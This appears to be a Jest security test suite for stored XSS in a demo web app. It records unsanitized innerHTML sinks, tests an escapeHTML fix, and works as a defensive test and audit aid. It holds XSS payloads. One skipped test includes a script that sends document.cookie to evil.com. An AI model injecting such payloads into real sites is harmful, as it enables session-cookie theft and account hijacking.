/**
 * WSTG-INPV-01: Stored XSS Testing
 * Tests for persistent Cross-Site Scripting vulnerabilities
 *
 * Severity: Critical
 * OWASP Reference: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting
 */

const { sanitizationTestPayloads, xssPayloads } = require('../utils/xss-payloads');
const { mockDialogs, hasScriptExecutionRisk } = require('../utils/security-test-helpers');
const { AppState, escapeHTML } = require('../../../app.js');

describe('WSTG-INPV-01: Stored XSS Testing', () => {
  let appState;
  let dialogMock;

  beforeEach(() => {
    // Mock dialogs to detect XSS execution
    dialogMock = mockDialogs();

    localStorage.clear();
    appState = new AppState();
    appState.login('demo', 'password');
  });

  afterEach(() => {
    dialogMock.restore();
    localStorage.clear();
  });

  describe('Todo/Memo Input - XSS Vectors', () => {
    test.each(sanitizationTestPayloads)(
      'VULNERABLE: Todo input accepts and stores XSS payload: %s',
      (payload) => {
        // Add todo with XSS payload
        appState.addTodo(payload);

        // Verify payload is stored (this documents the vulnerability)
        const todos = appState.todos;
        expect(todos.length).toBe(1);
        expect(todos[0].text).toBe(payload);

        // Note: This test documents that the application stores malicious input
        // The actual XSS execution would occur during rendering
      }
    );

    test('VULNERABLE: innerHTML renders todo text without sanitization', () => {
      const xssPayload = '<img src=x onerror="alert(\'XSS\')">';
      appState.addTodo(xssPayload);

      // Check if the todo list uses innerHTML (vulnerability indicator)
      const todoList = document.getElementById('todo-list');

      // Simulate rendering (the app uses innerHTML in renderTodos)
      // This documents the vulnerability location: app.js renderTodos method
      expect(appState.todos[0].text).toContain('<img');
      expect(appState.todos[0].text).toContain('onerror');

      // Document: app.js:1162 uses innerHTML to render todo.text
      // Recommendation: Use textContent or sanitize input
    });

    test('Security Recommendation: textContent should be used instead of innerHTML', () => {
      const xssPayload = '<script>alert(1)</script>';

      // Safe rendering example using textContent
      const safeElement = document.createElement('span');
      safeElement.textContent = xssPayload;

      // When using textContent, the script tag is escaped as text
      expect(safeElement.innerHTML).toBe('&lt;script&gt;alert(1)&lt;/script&gt;');
      expect(safeElement.textContent).toBe(xssPayload);
    });
  });

  describe('Shipping Information - XSS Vectors', () => {
    test.skip('VULNERABLE: Order stores shipping info without sanitization', () => {
      // Skipped: Requires UI interaction to test order creation flow
      // Document: app.js renders order items using innerHTML
      // Malicious shipping names could execute XSS when order history is displayed
      const maliciousName = '<script>document.location="http://evil.com?c="+document.cookie</script>';
      appState.addToCart(1);
    });
  });

  describe('Search Input - XSS Vectors', () => {
    test('Search input value is used in filter without sanitization', () => {
      const searchInput = document.getElementById('search-input');
      const xssPayload = '<img src=x onerror=alert(1)>';

      searchInput.value = xssPayload;

      // The search filters products client-side
      // While the value itself isn't directly rendered as HTML in search,
      // it's good practice to sanitize all inputs
      expect(searchInput.value).toBe(xssPayload);
    });
  });

  describe('User Profile - XSS Vectors', () => {
    test('VULNERABLE: User profile displayName accepts HTML', () => {
      const maliciousName = '<img src=x onerror="alert(1)">';

      // Set malicious display name in profile via currentUser
      appState.currentUser.profile = {
        displayName: maliciousName,
        phone: '090-1234-5678',
        paymentMethod: 'credit_card',
      };

      // Document: Profile display name is rendered in user-profile.js
      // Potential XSS when rendering profile page
      expect(appState.currentUser.profile.displayName).toBe(maliciousName);
    });
  });

  describe('XSS Payload Execution Detection', () => {
    test('Document: Multiple innerHTML usage locations identified', () => {
      // This test documents all innerHTML usage that could lead to XSS
      const vulnerableLocations = [
        { file: 'app.js', line: 818, context: 'productCard.innerHTML - renders product cards' },
        { file: 'app.js', line: 870, context: 'cartItem.innerHTML - renders cart items' },
        { file: 'app.js', line: 1162, context: 'todoItem.innerHTML - renders todo text (CRITICAL)' },
        { file: 'app.js', line: 1098, context: 'orderCard.innerHTML - renders order history' },
        { file: 'user-profile.js', line: 164, context: 'todoItem.innerHTML - renders profile todos' },
        { file: 'user-profile.js', line: 209, context: 'orderItem.innerHTML - renders profile orders' },
      ];

      // Log vulnerable locations for security audit
      vulnerableLocations.forEach(loc => {
        console.log(`SECURITY: innerHTML at ${loc.file}:${loc.line} - ${loc.context}`);
      });

      expect(vulnerableLocations.length).toBeGreaterThan(0);
    });
  });

  describe('XSS Mitigation - escapeHTML Function', () => {
    test('FIXED: escapeHTML properly escapes script tags', () => {
      const payload = '<script>alert(1)</script>';
      const escaped = escapeHTML(payload);

      expect(escaped).toBe('&lt;script&gt;alert(1)&lt;/script&gt;');
      expect(escaped).not.toContain('<script>');
    });

    test('FIXED: escapeHTML properly escapes img onerror', () => {
      const payload = '<img src=x onerror="alert(1)">';
      const escaped = escapeHTML(payload);

      expect(escaped).toBe('&lt;img src=x onerror=&quot;alert(1)&quot;&gt;');
      expect(escaped).not.toContain('<img');
    });

    test('FIXED: escapeHTML properly escapes svg onload', () => {
      const payload = '<svg onload="alert(1)">';
      const escaped = escapeHTML(payload);

      expect(escaped).toBe('&lt;svg onload=&quot;alert(1)&quot;&gt;');
      expect(escaped).not.toContain('<svg');
    });

    test('FIXED: escapeHTML handles all special characters', () => {
      const payload = '"><script>alert(1)</script><"';
      const escaped = escapeHTML(payload);

      expect(escaped).toBe('&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;');
      expect(escaped).not.toContain('<');
      expect(escaped).not.toContain('>');
    });

    test('FIXED: escapeHTML handles single quotes', () => {
      const payload = "'-alert(1)-'";
      const escaped = escapeHTML(payload);

      expect(escaped).toBe('&#039;-alert(1)-&#039;');
      expect(escaped).not.toContain("'");
    });

    test('FIXED: escapeHTML handles null and undefined', () => {
      expect(escapeHTML(null)).toBe('');
      expect(escapeHTML(undefined)).toBe('');
    });

    test('FIXED: escapeHTML preserves normal text', () => {
      const normalText = 'Buy milk and eggs';
      const escaped = escapeHTML(normalText);

      expect(escaped).toBe(normalText);
    });

    test('FIXED: escapeHTML handles Japanese text', () => {
      const japaneseText = '牛乳と卵を買う';
      const escaped = escapeHTML(japaneseText);

      expect(escaped).toBe(japaneseText);
    });

    test.each(sanitizationTestPayloads)(
      'FIXED: escapeHTML neutralizes XSS payload: %s',
      (payload) => {
        const escaped = escapeHTML(payload);

        // Escaped output should not contain raw < or > characters
        expect(escaped).not.toMatch(/<[^&]/);

        // Verify rendering is safe
        const testDiv = document.createElement('div');
        testDiv.innerHTML = escaped;

        // The escaped content should not execute scripts
        expect(hasScriptExecutionRisk(testDiv)).toBe(false);
      }
    );
  });
});
